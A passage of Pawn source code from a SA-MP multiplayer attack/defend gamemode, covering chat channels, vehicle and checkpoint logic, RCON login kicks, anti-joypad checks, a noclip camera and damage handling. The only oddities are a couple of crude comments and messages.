			if(Player[killerid][TextPos] == false) format(str, sizeof(str), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[killerid][RoundKills], MAIN_TEXT_COLOUR, Player[killerid][RoundDamage], MAIN_TEXT_COLOUR, Player[killerid][TotalDamage]);
			else format(str, sizeof(str), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[killerid][RoundKills], MAIN_TEXT_COLOUR, Player[killerid][RoundDamage], MAIN_TEXT_COLOUR, Player[killerid][TotalDamage]);
			PlayerTextDrawSetString(killerid, RoundKillDmgTDmg, str);

			if(GameType == BASE)
		   		format(str, sizeof(str), "%s%s {FFFFFF}killed %s%s {FFFFFF}<%s%s{FFFFFF}> {FFFFFF}with %s | %.1f ft | %.0f HP", TextColor[Player[killerid][Team]], Player[killerid][Name], TextColor[Player[playerid][Team]], Player[playerid][Name], TextColor[Player[playerid][Team]], Player[playerid][PlayerTypeByWeapon], WeaponNames[reason],GetDistanceBetweenPlayers(killerid, playerid), (HP[0] + HP[1]));
			else
			    format(str, sizeof(str), "%s%s {FFFFFF}killed %s%s {FFFFFF}with %s | %.1f ft | %.0f HP", TextColor[Player[killerid][Team]], Player[killerid][Name], TextColor[Player[playerid][Team]], Player[playerid][Name], WeaponNames[reason],GetDistanceBetweenPlayers(killerid, playerid), (HP[0] + HP[1]));

			SendClientMessageToAll(-1, str);

            OnPlayerAmmoUpdate(playerid);

			Player[playerid][TempTeam] = Player[playerid][Team];
		}
	}


	if(Player[playerid][Playing] == true)
	{
		new Float:Pos[3];
		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

	    foreach(new i : Player)
		{
			if(Player[playerid][Team] == ATTACKER)
			{
				if(Player[i][Team] == ATTACKER && Player[i][Playing] == true)
				{
                    SetPlayerMapIcon( i, Player[playerid][DeathIcon], Pos[0], Pos[1], Pos[2],23, 0, MAPICON_GLOBAL );
					IconTimer[playerid] = SetTimerEx("PlayerDeathIcon", 5000, false, "i", playerid);
				}
			}
			else if(Player[playerid][Team] == DEFENDER)
			{
			    if(Player[i][Team] == DEFENDER)
				{
                    SetPlayerMapIcon( i, Player[playerid][DeathIcon], Pos[0], Pos[1], Pos[2],23, 0, MAPICON_GLOBAL );
					IconTimer[playerid] = SetTimerEx("PlayerDeathIcon", 5000, false, "i", playerid);
				}
			}
		}
	}

	PlayerTextDrawHide(playerid, AreaCheckTD);
	PlayerTextDrawHide(playerid, AreaCheckBG);


	#if ENABLED_TDM == 1
	if( Current != -1 && GameType == TDM && ArenaStarted == true )
	{
	    if( Player[playerid][Playing] == true )
	    {
			switch( Player[playerid][Team] )
			{
			    case ATTACKER:
				{
					TeamTDMKills[DEFENDER]++;
					Player[playerid][InTDM] = true;
					SetHP(playerid, 100);
					SpawnPlayerEx(playerid);
					return 1;
				}
			    case DEFENDER:
				{
					TeamTDMKills[ATTACKER]++;
					Player[playerid][InTDM] = true;
					SetHP(playerid, 100);
					SpawnPlayerEx(playerid);
					return 1;
				}
			}
		}
	}
	#endif

	if(Player[playerid][Playing] == true)
	{
	    if(Player[playerid][Team] == ATTACKER)
		{
	        foreach(new i : Player)
			{
	            if(Player[i][Team] == ATTACKER && Player[i][Playing] == true)
				{
					ColorFix(playerid);
					SpectatePlayer(playerid, i);
					break;
				}
			}
		}
		else if(Player[playerid][Team] == DEFENDER)
		{
		    foreach(new i : Player)
			{
		        if(Player[i][Team] == DEFENDER && Player[i][Playing] == true)
				{
					ColorFix(playerid);
					SpectatePlayer(playerid, i);
					break;
				}
			}
		}
	}

	Player[playerid][InDM] = false;
	Player[playerid][Playing] = false;

	if(Player[playerid][WeaponPicked] > 0)
	{
 		TimesPicked[Player[playerid][Team]][Player[playerid][WeaponPicked]-1]--;
 		Player[playerid][WeaponPicked] = 0;
	}
	
	if(Player[playerid][WasInCP] == true)
	{
	    PlayersInCP --;
	    Player[playerid][WasInCP] = false;
		if(PlayersInCP <= 0)
		{
		    CurrentCPTime = ConfigCPTime;
		    TextDrawHideForAll(EN_CheckPoint);
		}
	}
	
	if(Player[playerid][BeingSpeced] == true)
	{
		foreach(new i : Player)
		{
		    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid)
			{
				if(Current != -1 && (Player[i][Team] == ATTACKER || Player[i][Team] == ATTACKER_SUB || Player[i][Team] == DEFENDER || Player[i][Team] == DEFENDER_SUB))
				{
					SpectateNextTeamPlayer(i);
				}
				else
				{
				    SpectateNextPlayer(i);
				}
			}
		}
	}

	SetHP(playerid, 100);
	SpawnPlayerEx(playerid);
	return 1;
}

public OnPlayerText(playerid, text[])
{
	if(AntiSpam == true && GetTickCount() < Player[playerid][lastChat])
	{
		SendErrorMessage(playerid, "Please wait.");
		return 0;
	}
	Player[playerid][lastChat] = GetTickCount()+1000;

	if(text[0] == '#' && Player[playerid][ChatChannel] != -1)
	{
        format(ChatString, sizeof(ChatString), ".: Private Chat | %s | {FFFFFF}%d{FFCC99} | %s", Player[playerid][Name], OnlineInChannel[Player[playerid][ChatChannel]], text[1]);
        OnlineInChannel[Player[playerid][ChatChannel]] = 0;

		foreach(new i : Player)
		{
            if(Player[i][ChatChannel] == Player[playerid][ChatChannel])
			{
                SendClientMessage(i, 0xFFCC99FF, ChatString);
                PlayerPlaySound(i,1137,0.0,0.0,0.0);
                OnlineInChannel[Player[playerid][ChatChannel]]++;
			}
		}
	    return 0;
	}

	if(text[0] == '!')
	{
	    new ChatColor;
	    switch(Player[playerid][Team])
		{
	        case REFEREE: 		ChatColor = 0xFFFF90FF;
	        case DEFENDER: 		ChatColor = 0x0088FFFF;
	        case ATTACKER: 		ChatColor = 0xFF2040FF;
	        case ATTACKER_SUB: 	ChatColor = ATTACKER_SUB_COLOR;
	        case DEFENDER_SUB: 	ChatColor = DEFENDER_SUB_COLOR;
	        case NON:
			{ SendErrorMessage(playerid,"You must be part of a team."); return 0; }
	    }
		format(ChatString,sizeof(ChatString),".: Team Chat | %s (%d) | %s", Player[playerid][Name], playerid, text[1]);

		foreach(new i : Player)
		{
			if(Player[i][Team] != NON)
			{
		        if((Player[playerid][Team] == ATTACKER || Player[playerid][Team] == ATTACKER_SUB) && (Player[i][Team] == ATTACKER || Player[i][Team] == ATTACKER_SUB))
				{ SendClientMessage(i, ChatColor, ChatString); PlayerPlaySound(i,1137,0.0,0.0,0.0); }
		        if((Player[playerid][Team] == DEFENDER || Player[playerid][Team] == DEFENDER_SUB) && (Player[i][Team] == DEFENDER || Player[i][Team] == DEFENDER_SUB))
				{ SendClientMessage(i, ChatColor, ChatString); PlayerPlaySound(i,1137,0.0,0.0,0.0); }
				if(Player[playerid][Team] == REFEREE && Player[i][Team] == REFEREE)
			   	{ SendClientMessage(i, ChatColor, ChatString); PlayerPlaySound(i,1137,0.0,0.0,0.0); }
			}
		}
	    return 0;
	}
	else
	{
	    if(Player[playerid][Mute] == true)
		{ SendErrorMessage(playerid,"You are muted, STFU."); return 0; }
	}

	if(text[0] == '@' && Player[playerid][Level] > 0) {
        format(ChatString, sizeof(ChatString), ".: Admin Chat | %s (%d) | %s", Player[playerid][Name], playerid, text[1]);
        foreach(new i : Player) {
            if(Player[i][Level] > 0) {
                SendClientMessage(i, 0x66CC66FF, ChatString);
                PlayerPlaySound(i,1137,0.0,0.0,0.0);
			}
		}

		return 0;
	}

	//maymay is a motherfucker
	if(text[0] == '^')
	{
	    if(text[1] == 'r' || text[1] == 'R') // red
	    {
        	format(ChatString, sizeof(ChatString), "(%d) {FF0000}%s", playerid, text[2]);
       		SendPlayerMessageToAll(playerid, ChatString);
			return 0;
		}
		else if(text[1] == 'b' || text[1] == 'B') // blue
	    {
        	format(ChatString, sizeof(ChatString), "(%d) {0000FF}%s", playerid, text[2]);
       		SendPlayerMessageToAll(playerid, ChatString);
			return 0;
		}
		else if(text[1] == 'y' || text[1] == 'Y') // yellow
	    {
        	format(ChatString, sizeof(ChatString), "(%d) {FFFF00}%s", playerid, text[2]);
       		SendPlayerMessageToAll(playerid, ChatString);
			return 0;
		}
		else if(text[1] == 'o' || text[1] == 'O') // orange
	    {
        	format(ChatString, sizeof(ChatString), "(%d) {FF6600}%s", playerid, text[2]);
       		SendPlayerMessageToAll(playerid, ChatString);
			return 0;
		}
		else if(text[1] == 'g' || text[1] == 'G') // green
	    {
        	format(ChatString, sizeof(ChatString), "(%d) {33FF00}%s", playerid, text[2]);
       		SendPlayerMessageToAll(playerid, ChatString);
			return 0;
		}
		else if(text[1] == 'p' || text[1] == 'P') // pink
	    {
        	format(ChatString, sizeof(ChatString), "(%d) {FF879C}%s", playerid, text[2]);
       		SendPlayerMessageToAll(playerid, ChatString);
			return 0;
		}
		
	}
	//maymay is a motherfucker
	
	format(ChatString, sizeof(ChatString),"(%d) %s", playerid, text);
    SendPlayerMessageToAll(playerid,ChatString);
	return 0;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
    switch(newstate)
	{
	    case PLAYER_STATE_DRIVER:
		{
	        Player[playerid][iLastVehicle] = GetPlayerVehicleID(playerid);

            if(Player[playerid][Team] == DEFENDER && Player[playerid][Playing] == true)
			{
				//RemovePlayerFromVehicle(playerid);
				new Float:defPos[3];
				GetPlayerPos(playerid, defPos[0], defPos[1], defPos[2]);
				SetPlayerPos(playerid, defPos[0]+1.0, defPos[1]+1.0, defPos[2]+1.0);
				return 1;
			}

			SetPlayerArmedWeapon(playerid,0);

			if(Player[playerid][BeingSpeced] == true)
			{
	            foreach(new i : Player)
				{
		            if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid)
					{
			            TogglePlayerSpectating(i, 1);
			            PlayerSpectateVehicle(i, GetPlayerVehicleID(playerid));
		            }
		        }
			}

			switch(Player[playerid][Team])
			{
				case ATTACKER: ChangeVehicleColor(GetPlayerVehicleID(playerid), 175, 175);
				case ATTACKER_SUB: ChangeVehicleColor(GetPlayerVehicleID(playerid), 158, 158);
				case DEFENDER: ChangeVehicleColor(GetPlayerVehicleID(playerid), 198, 198);
				case DEFENDER_SUB: ChangeVehicleColor(GetPlayerVehicleID(playerid), 208, 208);
				case REFEREE: ChangeVehicleColor(GetPlayerVehicleID(playerid), 200, 200);
			}

			if(Player[playerid][Playing] == true && Player[playerid][WasInCP] == true)
			{
				if(IsPlayerInRangeOfPoint(playerid, 2.0, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2]))
				{
			  		PlayersInCP--;
				 	Player[playerid][WasInCP] = false;
				    ColorFix(playerid);

					if(PlayersInCP <= 0)
					{
					    CurrentCPTime = ConfigCPTime;
					    TextDrawHideForAll(EN_CheckPoint);
					}
					RadarFix();
				}
			}
		}
		case PLAYER_STATE_PASSENGER:
		{
            Player[playerid][iLastVehicle] = GetPlayerVehicleID(playerid);

			if(Player[playerid][Team] == DEFENDER && Player[playerid][Playing] == true)
			{
				//RemovePlayerFromVehicle(playerid);
				new Float:defPos[3];
				GetPlayerPos(playerid, defPos[0], defPos[1], defPos[2]);
				SetPlayerPos(playerid, defPos[0]+1.0, defPos[1]+1.0, defPos[2]+1.0);
				return 1;
			}

			SetPlayerArmedWeapon(playerid,0);

			if(Player[playerid][BeingSpeced] == true)
			{
	            foreach(new i : Player)
				{
		            if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid)
					{
			            TogglePlayerSpectating(i, 1);
			            PlayerSpectateVehicle(i, GetPlayerVehicleID(playerid));
		            }
		        }
			}

			if(Player[playerid][Playing] == true && Player[playerid][WasInCP] == true)
			{
				if(IsPlayerInRangeOfPoint(playerid, 2.0, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2]))
				{
			  		PlayersInCP--;
				 	Player[playerid][WasInCP] = false;
				    ColorFix(playerid);

					if(PlayersInCP <= 0) 
					{
					    CurrentCPTime = ConfigCPTime;
					    TextDrawHideForAll(EN_CheckPoint);
					}
					RadarFix();
				}
			}

	    }
		case PLAYER_STATE_ONFOOT:
		{
	        if(oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_PASSENGER)
			{
				if(Player[playerid][BeingSpeced] == true)
				{
		            foreach(new i : Player)
					{
			            if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid)
						{
				            TogglePlayerSpectating(i, 1);
				            PlayerSpectatePlayer(i, playerid);
			            }
			        }
				}

				if(Current != -1 && GameType == BASE && Player[playerid][Playing] == true && Player[playerid][Team] == ATTACKER)
				{
					if(IsPlayerInRangeOfPoint(playerid, 2.0, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2]))
					{
						OnPlayerEnterCheckpoint(playerid);
					}
				}

		        if(Player[playerid][iLastVehicle] > -1)
				{
					new vehicleid = Player[playerid][iLastVehicle];

					new bool:InVehicle = false;
				    foreach(new i : Player)
					{
				    	if(i != playerid && IsPlayerInVehicle(i, vehicleid))
						{
					        InVehicle = true;
						}
					}

				 	if(InVehicle == false) {
						new Float:VehiclePoss[4], Float:VehicleVelocity[3], VehicleModel, Panels, Doors, Lights, Tires, Float:VehicleHealth, VehicleColor, VehicleTrailer;
			            GetVehiclePos(vehicleid, VehiclePoss[0], VehiclePoss[1], VehiclePoss[2]);
						GetVehicleZAngle(vehicleid, VehiclePoss[3]);

						GetVehicleVelocity(vehicleid, VehicleVelocity[0], VehicleVelocity[1], VehicleVelocity[2]);
						VehicleModel = GetVehicleModel(vehicleid);

						GetVehicleHealth(vehicleid, VehicleHealth);

						GetVehicleDamageStatus(vehicleid, Panels, Doors, Lights, Tires);
		                VehicleTrailer = GetVehicleTrailer(vehicleid);

						DestroyVehicle(vehicleid);

						switch(Player[playerid][Team]) {
							case ATTACKER: VehicleColor = 175;
							case ATTACKER_SUB: VehicleColor = 158;
							case DEFENDER: VehicleColor = 198;
							case DEFENDER_SUB: VehicleColor = 208;
							case REFEREE: VehicleColor = 200;
						}

						vehicleid = CreateVehicle(VehicleModel, VehiclePoss[0], VehiclePoss[1], VehiclePoss[2], VehiclePoss[3], VehicleColor, VehicleColor, -1);

						new plate[32];
						format(plate, sizeof(plate), "%s", Player[playerid][NameWithoutTag]);
					    SetVehicleNumberPlate(vehicleid, plate);
					    SetVehicleToRespawn(vehicleid);

						LinkVehicleToInterior(vehicleid, GetPlayerInterior(playerid));
						SetVehicleVirtualWorld(vehicleid, GetPlayerVirtualWorld(playerid));
				        SetVehicleVelocity(vehicleid, VehicleVelocity[0], VehicleVelocity[1], VehicleVelocity[2]);

						UpdateVehicleDamageStatus(vehicleid, Panels, Doors, Lights, Tires);
						SetVehicleHealth(vehicleid, VehicleHealth);

						if(VehicleTrailer != 0) AttachTrailerToVehicle(VehicleTrailer, vehicleid);
						Player[playerid][iLastVehicle] = -1;
					}
				}
			}
	    }
    }

	return 1;
}

public OnVehicleSpawn(vehicleid)
{
	if(GetVehicleModel(vehicleid) == 563)
	{
	    HeliWoodenBoard[vehicleid] = CreateObject(19128,0,0,0,0,0,0,80);
		AttachObjectToVehicle(HeliWoodenBoard[vehicleid], vehicleid, 0.0, 6.299995, -1.200000, 0.000000, 0.000000, 0.000000);
 	}
 	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
    if(HeliWoodenBoard[vehicleid] > -1)
    {
        DestroyObject(HeliWoodenBoard[vehicleid]);
        HeliWoodenBoard[vehicleid] = -1;
    }
	return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	foreach (new i : Player)
	{
	    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid)
		{
			SetPlayerInterior(i,newinteriorid);
		}
	}
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
    if(!IsPlayerInAnyVehicle(playerid) && Player[playerid][Playing] == true)
	{
		switch(Player[playerid][Team])
		{
		    case ATTACKER:
			{
		        new Float:attPos[3];
			    GetPlayerPos(playerid, attPos[0], attPos[1], attPos[2]);
			    if(attPos[2] <= (BCPSpawn[Current][2] - 1.4))
			    	return 1;

				PlayersInCP++;
				Player[playerid][WasInCP] = true;

				new iString[256];
				new Float:HP, Float:AP;
				format(iString, sizeof iString, "%sPlayers In CP", MAIN_TEXT_COLOUR);
				foreach(new i : Player) {
				    if(Player[i][WasInCP] == true) {
				        GetHP(i, HP);
				        GetAP(i, AP);
				        format(iString, sizeof(iString), "%s~n~~r~~h~- %s%s (%.0f)", iString, MAIN_TEXT_COLOUR, Player[i][Name], (HP+AP));
					}
				}
				TextDrawSetString(EN_CheckPoint, iString);
				TextDrawShowForAll(EN_CheckPoint);

			} case DEFENDER:
			{
				new Float:defPos[3];
			    GetPlayerPos(playerid, defPos[0], defPos[1], defPos[2]);
			    if(defPos[2] >= (BCPSpawn[Current][2] - 1.4))
			    	CurrentCPTime = ConfigCPTime;
				else
				    if(CurrentCPTime < ConfigCPTime)
				    	SendClientMessageToAll(-1, sprintf(""COL_PRIM"CP touch by {FFFFFF}%s "COL_PRIM"is denied. This might be considered as cheating or bug abusing.", Player[playerid][Name]));
			}
		}
	}
    return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(Player[playerid][Level] == 5 && Player[playerid][Playing] == false && Player[playerid][InDM] == false && Player[playerid][InDuel] == false && Player[playerid][Spectating] == false && Player[playerid][AntiLag] == false) {
		SetPlayerPosFindZ(playerid, fX, fY, fZ);
	}
    return 1;
}

public OnPlayerLeaveCheckpoint(playerid) {
	if(Player[playerid][Team] == ATTACKER && Player[playerid][WasInCP] == true) {
		PlayersInCP--;
	 	Player[playerid][WasInCP] = false;

		new iString[256];
		new Float:HP, Float:AP;
		format(iString, sizeof iString, "%sPlayers In CP", MAIN_TEXT_COLOUR);
		foreach(new i : Player) {
		    if(Player[i][WasInCP] == true) {
		        GetHP(i, HP);
		        GetAP(i, AP);
		        format(iString, sizeof(iString), "%s~n~~r~~h~- %s%s (%.0f)", iString, MAIN_TEXT_COLOUR, Player[i][Name], (HP+AP));
			}
		}
		TextDrawSetString(EN_CheckPoint, iString);

		if(PlayersInCP <= 0) {
		    CurrentCPTime = ConfigCPTime;
		    TextDrawHideForAll(EN_CheckPoint);
		}
	}
    return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	new Str[150], iName[MAX_PLAYER_NAME], playerid;

	foreach(new i : Player){
		new IP[16];
		GetPlayerIp(i, IP, sizeof(IP));
	    if(!strcmp(IP, ip)) {
			GetPlayerName(i, iName, sizeof(iName));
			playerid = i;
		}
	}

    if(!success) {
		format(Str, sizeof(Str), "{FFFFFF}%s "COL_PRIM"has failed to log into rcon.", iName);
        SendClientMessageToAll(-1, Str);

        Player[playerid][RconTry]++;
		SendClientMessage(playerid, -1, "Wrong password one more time will get you kicked.");

		if(Player[playerid][RconTry] >= 2){
			format(Str, sizeof(Str), "{FFFFFF}%s "COL_PRIM"has been kicked for fail attempt to log into rcon", iName);
			SendClientMessageToAll(-1, Str);
			SetTimerEx("OnPlayerKicked", 500, false, "i", playerid);
			return 1;
		}
    } else {
		format(Str, sizeof(Str), "{FFFFFF}%s "COL_PRIM"has successfully logged into rcon.", iName);
		foreach(new j : Player) {
			if(Player[j][Level] > 4) SendClientMessage(j, -1, Str);
		}
	}
    return 1;
}

public OnPlayerUpdate(playerid)
{
	Player[playerid][PauseCount] = 0;
	
	if(RoundPaused == true)
	{
        if(Player[playerid][Playing] == true && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && VehiclePos[playerid][0] != 0.0 && VehiclePos[playerid][1] != 0.0)
		{
            SetVehiclePos(GetPlayerVehicleID(playerid), VehiclePos[playerid][0], VehiclePos[playerid][1], VehiclePos[playerid][2]);
		}
	}
	
    //antijoypad
	if(lagcompmode != 0 || ServerAntiLag == true)
	{
	    new keys, ud, lr;
		GetPlayerKeys(playerid, keys, ud, lr);
		if ((ud != 128 && ud != 0 && ud != -128) || (lr != 128 && lr != 0 && lr != -128))
		{
			new str[128];
		    format(str, sizeof(str), "{FFFFFF}** System ** "COL_PRIM"has kicked {FFFFFF}%s "COL_PRIM"for using joypad", Player[playerid][Name]);
		    SendClientMessageToAll(-1, str);

			Player[playerid][DontPause] = true;
		    SetTimerEx("OnPlayerKicked", 100, false, "i", playerid);
		}
	}
	//antijoypad


	if(noclipdata[playerid][cameramode] == CAMERA_MODE_FLY)
	{
		if(noclipdata[playerid][noclipcammode] && (GetTickCount() - noclipdata[playerid][lastmove] > 100))
		{
		    // If the last move was > 100ms ago, process moving the object the players camera is attached to
		    MoveCamera(playerid);
		}
        new keys, ud, lr;
		GetPlayerKeys(playerid, keys, ud, lr);
		// Is the players current key state different than their last keystate?
		if(noclipdata[playerid][udold] != ud || noclipdata[playerid][lrold] != lr)
		{
			if((noclipdata[playerid][udold] != 0 || noclipdata[playerid][lrold] != 0) && ud == 0 && lr == 0)
			{   // All keys have been released, stop the object the camera is attached to and reset the acceleration multiplier
				StopPlayerObject(playerid, noclipdata[playerid][flyobject]);
				noclipdata[playerid][noclipcammode] = 0;
				noclipdata[playerid][accelmul]  = 0.0;
			}
			else
			{   // Indicates a new key has been pressed

			    // Get the direction the player wants to move as indicated by the keys
				noclipdata[playerid][noclipcammode] = GetMoveDirectionFromKeys(ud, lr);

				// Process moving the object the players camera is attached to
				MoveCamera(playerid);
			}
		}
		noclipdata[playerid][udold] = ud; noclipdata[playerid][lrold] = lr; // Store current keys pressed for comparison next update
		return 0;
	}

	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	if(Player[playerid][Playing] == true && Player[forplayerid][Playing] == true)
	{
		if(Player[forplayerid][Team] != Player[playerid][Team])
		{
			SetPlayerMarkerForPlayer(forplayerid,playerid, GetPlayerColor(playerid) & 0xFFFFFF00);
		}
		else
		{
			SetPlayerMarkerForPlayer(forplayerid,playerid,GetPlayerColor(playerid) | 0x00000055);
		}
	}
	else if(Player[playerid][Playing] == true && Player[forplayerid][Playing] == false)
	{
		if(Player[forplayerid][Team] != Player[playerid][Team])
		{
			SetPlayerMarkerForPlayer(forplayerid,playerid, GetPlayerColor(playerid) & 0xFFFFFF00);
		}
		else
		{
			SetPlayerMarkerForPlayer(forplayerid,playerid,GetPlayerColor(playerid) | 0x00000055);
		}
	}
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	if(Player[playerid][Playing] == true && Player[forplayerid][Playing] == true)
	{
		if(Player[forplayerid][Team] != Player[playerid][Team])
		{
			SetPlayerMarkerForPlayer(forplayerid,playerid, GetPlayerColor(playerid) & 0xFFFFFF00);
		}
		else
		{
			SetPlayerMarkerForPlayer(forplayerid,playerid,GetPlayerColor(playerid) | 0x00000055);
		}
	}
	else if(Player[playerid][Playing] == true && Player[forplayerid][Playing] == false)
	{
		if(Player[forplayerid][Team] != Player[playerid][Team])
		{
			SetPlayerMarkerForPlayer(forplayerid,playerid, GetPlayerColor(playerid) & 0xFFFFFF00);
		}
		else
		{
			SetPlayerMarkerForPlayer(forplayerid,playerid,GetPlayerColor(playerid) | 0x00000055);
		}
	}
	return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid, bodypart)
{

	if(Player[damagedid][OnGunmenu] && Player[damagedid][Playing])
        return 1;

	if(Player[damagedid][IsAFK])
	{
		return 1;
	}

	if(ToggleTargetInfo == true)
	{
	    ShowTargetInfo(playerid, damagedid);
	}

    // slit throat with a knife
    if(amount > 1800 && weaponid == 4 && GetPlayerAnimationIndex(playerid) == 747) {

        Player[damagedid][HitBy] = playerid;
		Player[damagedid][HitWith] = weaponid;

		if(!ServerAntiLag) {
		    CallLocalFunction("OnPlayerTakeDamage", "ddfdd", damagedid, playerid, amount, weaponid, bodypart);
		}

		SetHP(damagedid, 0);

		if(!ServerAntiLag) return 1;
	}

	if(ServerAntiLag == false) {
		if(Player[damagedid][AntiLag] == false) return 1;
	    if(playerid != INVALID_PLAYER_ID && Player[playerid][AntiLag] == false) return 1;
	} else {
	    if(Player[playerid][Playing] == true || Player[damagedid][Playing] == true) {
	        if(Player[damagedid][Team] == Player[playerid][Team]) return 1;
	        if(Player[playerid][Playing] == true && Player[damagedid][Playing] == false) return 1;
	        if(Player[damagedid][Team] == REFEREE) return 1;
		}
	}
	if(Player[damagedid][PauseCount] > 2) return 1;

	new Float:Health[2], Float:Damage;
	GetHP(damagedid, Health[0]);
	GetAP(damagedid, Health[1]);
	
	if(Health[0] > 0) {
	    if(amount > Health[0]) {
	        Damage = amount - Health[0];
	        amount = amount - Damage;
		}
	}

	Player[damagedid][HitBy] = playerid;
	Player[damagedid][HitWith] = weaponid;

    new Float:health, Float:armor;

    armor = Health[1];
    health = Health[0];

    new bool:setArmor = false;

    if( armor > 0.0) {
        armor = armor - amount;
        setArmor = true;
    }

    if( amount > health && !setArmor ) {
        health = 0.0;
    } else if( !setArmor ) {
        health = health - amount;
    } else if( armor < 0.0 ) {
        health = health + armor;
        armor = 0.0;
    }

    SetAP(damagedid, armor);
    SetHP(damagedid, health);

    OnPlayerTakeDamage(damagedid, playerid, amount, -1, bodypart );

	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
    if((Player[playerid][OnGunmenu] && Player[playerid][Playing]) ||
    	(weaponid == 49 || weaponid == 50 || weaponid == 51 || (weaponid == 54 && amount <= 10)) ||
    	Player[playerid][IsAFK])
    {
    	// Fix HP bars from going out of sync
    	new Float:hp, Float:ar;

    	// Get fake hp
    	GetHP(playerid, hp);
    	GetAP(playerid, ar);

    	// Set fake hp (will cause hp/armour flicker)
    	SetHP(playerid, hp);
    	SetAP(playerid, ar);
        return 1;
    }


    //ShowHitArrow(playerid, issuerid);

	if(playerid != INVALID_PLAYER_ID && issuerid != INVALID_PLAYER_ID && bodypart == 9) // headshot
	{
	    new wepName[32], bool: nan_weapon = false;
		switch(weaponid)
		{
		    case WEAPON_SNIPER:
		    {format(wepName, sizeof wepName, "Sniper");}
		    case WEAPON_RIFLE:
		    {format(wepName, sizeof wepName, "Rifle");}
		    case WEAPON_DEAGLE:
		    {format(wepName, sizeof wepName, "Deagle");}
		    default: nan_weapon = true;
		}
		if( nan_weapon == false )
		{
			new shootername[MAX_PLAYER_NAME], shotname[MAX_PLAYER_NAME];
			GetPlayerName(playerid, shotname, sizeof shotname);
			GetPlayerName(issuerid, shootername, sizeof shootername);
			SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has landed a hit on {FFFFFF}%s's "COL_PRIM"head "COL_PRIM"({FFFFFF}%s"COL_PRIM")", shootername, shotname, wepName));
		}
	}

	if(ToggleTargetInfo == true)
	{
	    ShowTargetInfo(issuerid, playerid);
	}

	if(ServerAntiLag == true && weaponid != -1)
		return 1;

	new Float:Health[3], Float:Damage;
	GetHP(playerid, Health[0]);
	GetAP(playerid, Health[1]);

	if(ServerAntiLag == false) {
		if(Player[playerid][AntiLag] == true && weaponid != -1) return 1;
		if(issuerid != INVALID_PLAYER_ID && Player[issuerid][AntiLag] == true && weaponid != -1) return 1;
	}

	if(weaponid == -1) weaponid = Player[playerid][HitWith];

	if(FallProtection == true && Player[playerid][Playing] == true) {
		if(weaponid == 54 || weaponid == 49 || weaponid == 50) {
	    	return 1; //SetHP(playerid, 100.0);
		} else {
		    if(issuerid != INVALID_PLAYER_ID) {
				if(Player[issuerid][Team] != Player[playerid][Team]) {
		    		FallProtection = false;
				}
			} else {
			    FallProtection = false;
			}
		}
	}

    // Fall Protection Improvement Part
	if(issuerid == INVALID_PLAYER_ID && Player[playerid][Playing] == true)
		if(Health[1] >= 1.0 && (Health[0] - amount) < RoundHP)
		    return 1;
	// <end>
	
	// Health and armour handling
	if(IsPlayerConnected(issuerid))
		if(Player[issuerid][Playing] == true && (Player[issuerid][Team] == Player[playerid][Team]))
			return 1;
			
    Player[playerid][HitBy] = issuerid;
 	Player[playerid][HitWith] = weaponid;

	if(weaponid == 54)
	{
	    SetHP(playerid, Health[0] - amount);
	}
	else if(Health[1] > 0.0)
	{
		if((Health[1] - amount) < 0)
		{
		    new Float:diff = (Health[1] - amount);
		    SetAP(playerid, 0.0);
		    SetHP(playerid, Health[0] + diff);
		}
		else
		    SetAP(playerid, Health[1] - amount);
	}
	else
	    SetHP(playerid, Health[0] - amount);
	// <end>

	if((BaseStarted == true || ArenaStarted == true) && TeamHPDamage == true)
	{
	    new
		    playerScores[MAX_PLAYERS][rankingEnum],
		    index,
		    p
		;
		
		foreach(new i : Player)
	 	{
		    if(Player[i][WasInBase] == true && TeamHPDamage == true)
			{
				playerScores[index][player_Score] = floatround(Player[i][RoundDamage], floatround_round);
		        playerScores[index++][player_ID] = i;
		        p++;
			}
		}
		
		if(BaseStarted == true)
		{
			GetPlayerHighestScores(playerScores, 0, index -1 );
			new AttOnline, DefOnline;

			ScoreString[0] = "";
			ScoreString[1] = "";
			ScoreString[2] = "";
			ScoreString[3] = "";

			for(new i = 0; i != p; ++i)
			{
				if(IsPlayerConnected(playerScores[i][player_ID]))
				{
					if(Player[playerScores[i][player_ID]][Team] == ATTACKER)
					{
					    AttOnline++;
					    if(Player[playerScores[i][player_ID]][Playing] == false && Player[playerScores[i][player_ID]][RoundDeaths] > 0)
						{
					    	if(AttOnline <= 3)
								format(ScoreString[0], 256, "%s%s| %s ~r~~h~Dead %s- ~r~%d~n~", ScoreString[0], MAIN_TEXT_COLOUR, Player[playerScores[i][player_ID]][NameWithoutTag], MAIN_TEXT_COLOUR, playerScores[i][player_Score]);
							else if(AttOnline <= 6)
